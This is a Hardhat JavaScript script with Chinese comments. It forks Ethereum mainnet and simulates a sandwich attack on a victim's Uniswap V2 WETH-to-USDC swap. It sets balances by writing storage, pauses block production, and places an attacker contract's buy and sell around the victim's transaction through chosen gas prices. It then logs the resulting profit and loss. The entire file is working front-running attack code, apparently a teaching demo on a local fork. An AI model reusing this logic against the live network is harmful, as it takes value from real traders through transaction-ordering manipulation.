// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const {network, ethers} = require("hardhat");
const hre = require("hardhat");


async function main() {
    // fork the mainnet
    await hre.network.provider.request({
        method: "hardhat_reset",
        params: [{
            forking: {
                jsonRpcUrl:"https://rpc.ankr.com/eth",
                blockNumber: 17626926
            }
        }]
    })

    // import vars
    const WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
    const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
    const Router = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
    //
    const [maliciousUser, victim] = await ethers.getSigners();
    //
    const amount = 1000000000000000000000; //1000 ETH

    // deplay the attack contract
    const attacker = await ethers.deployContract("Attacker");
    const maliciousContract = await attacker.getAddress();
    console.log("malicious attacker contract:", maliciousContract);

    // 我们需要让victim去执行一笔swap交易, ETH -> USDC
    // 然后malicious进行sandwich attack, 在victim swap之前，ETH -> USDC, 在victim swap之后， USDC -> ETH
    // 这需要victim和malicious账户有ETH
    // 我们在hardhat的fork中，直接修改数据给victim和malicuous账户配置ETH
    //
    // 一些有用的函数
    const toBytes32 = (bn) => {
        return ethers.hexlify(ethers.zeroPadValue(ethers.toBeHex(BigInt(bn)), 32));
    };
    const setStorageAt = async (address, index, value) => {
        await ethers.provider.send("hardhat_setStorageAt", [address, index, value]);
    };
    // balance information before manipulate
    const attackerWETHBalanceBeforeConfig = await attacker.getWETHBalance(maliciousContract);
    const attackerUSDCBalanceBeforeConfig = await attacker.getUSDCBalance(maliciousContract);
    console.log("WETH Balance Before Config (attacker) = ", BigInt(attackerWETHBalanceBeforeConfig).toString());
    console.log("USDC Balance Before Config (attacker) = ", BigInt(attackerUSDCBalanceBeforeConfig).toString());
    const victimWETHBalanceBeforeConfig = await attacker.getWETHBalance(victim.address);
    const victimUSDCBalanceBeforeConfig = await attacker.getUSDCBalance(victim.address);
    console.log("WETH Balance Before Config (victim) = ", BigInt(victimWETHBalanceBeforeConfig).toString());
    console.log("USDC Balance Before Config (victim) = ", BigInt(victimUSDCBalanceBeforeConfig).toString());
    // 下面的修改涉及到EVM的存储，请参考EVM存储
    //
    const attackerIndex = ethers.solidityPackedKeccak256(["uint256", "uint256"], [maliciousContract, 3]);
    await setStorageAt(WETH, attackerIndex, toBytes32(amount).toString());
    //
    const victimIndex = ethers.solidityPackedKeccak256(["uint256", "uint256"], [victim.address, 3]);
    await setStorageAt(WETH, victimIndex, toBytes32(amount).toString());
    // balance information after manipulate
    const attackerWETHBalanceBeforeAttack = await attacker.getWETHBalance(maliciousContract);
    const attackerUSDCBalanceBeforeAttack = await attacker.getUSDCBalance(maliciousContract);
    console.log("WETH Balance Before Attack (attacker) = ", BigInt(attackerWETHBalanceBeforeAttack).toString());
    console.log("USDC Balance Before Attack (attacker) = ", BigInt(attackerUSDCBalanceBeforeAttack).toString());
    const victimWETHBalanceBeforeAttack = await attacker.getWETHBalance(victim.address);
    const victimUSDCBalanceBeforeAttack = await attacker.getUSDCBalance(victim.address);
    console.log("WETH Balance Before Attack (victim) = ", BigInt(victimWETHBalanceBeforeAttack).toString());
    console.log("USDC Balance Before Attack (victim) = ", BigInt(victimUSDCBalanceBeforeAttack).toString());

    // 要在uniswap中执行swap，需要用户将自己的erc20 token approve给uniswap的router合约，以便uniswap在执行swap时可以transferFrom用户的erc20 token到合约地址
    // victim approve自己的WETH给uniswap的router
    const approveFunctionName = "approve";
    const IERC20Interface = new ethers.Interface([
        "function approve(address spender, uint256 amount) public"
    ]);
    const approveParams = [
        Router,
        BigInt(amount)
    ]
    await victim.sendTransaction({
        to: WETH,
        data: IERC20Interface.encodeFunctionData(approveFunctionName, approveParams)
    });
    
    // 之后，我们需要暂停出块
    // 目的是模拟victim提交swap transaction到mem pool等待ethereum主网共识出块时，malicious对此进行attack
    //
    await network.provider.send("evm_setAutomine", [false]);

    // victim提交swap transaction到mem pool
    // 1000 ETH -> USDC
    //
    const functionName = "swapExactTokensForTokens";
    const block = await ethers.provider.getBlock(17626926);
    const params = [
        BigInt(amount),
        BigInt(0),
        [
            WETH,
            USDC
        ],
        victim.address,
        block.timestamp + 7200
    ];
    const routerInterface = new ethers.Interface([
        "function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) public"
    ]);
    await victim.sendTransaction({
        to: Router,
        data: routerInterface.encodeFunctionData(functionName, params),
        gasLimit: 500000,
        gasPrice: ethers.parseUnits("100", "gwei")
    });

    // malicious进行sandwich attack
    // 在victim的swap交易前面执行swap 1000ETH -> USDC
    // 在victim的swap交易之后执行swap USDC -> ETH
    //
    await attacker.connect(maliciousUser).firstSwap(
        BigInt(amount), 
        {
            gasLimit: 500000,
            gasPrice: ethers.parseUnits("101", "gwei")
        }
    );
    await attacker.connect(maliciousUser).secondSwap(
        {
            gasLimit: 500000,
            gasPrice: ethers.parseUnits("99", "gwei")
        }
    );

    // 查看一下目前mem pool中pending的交易
    //
    const pendingBlock = await network.provider.send("eth_getBlockByNumber", [
        "pending",
        false,
    ]);
    console.log("Pending Block = ", pendingBlock);

    // 开启出块，交易将被执行
    //
    await ethers.provider.send("evm_mine", []);

    // balance information after attack
    const attackerWETHBalanceAfterAttack = await attacker.getWETHBalance(maliciousContract);
    const attackerUSDCBalanceAfterAttack = await attacker.getUSDCBalance(maliciousContract);
    console.log("WETH Balance After Attack (attacker) = ", BigInt(attackerWETHBalanceAfterAttack).toString());
    console.log("USDC Balance After Attack (attacker) = ", BigInt(attackerUSDCBalanceAfterAttack).toString());
    const victimWETHBalanceAfterAttack = await attacker.getWETHBalance(victim.address);
    const victimUSDCBalanceAfterAttack = await attacker.getUSDCBalance(victim.address);
    console.log("WETH Balance After Attack (victim) = ", BigInt(victimWETHBalanceAfterAttack).toString());
    console.log("USDC Balance After Attack (victim) = ", BigInt(victimUSDCBalanceAfterAttack).toString());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
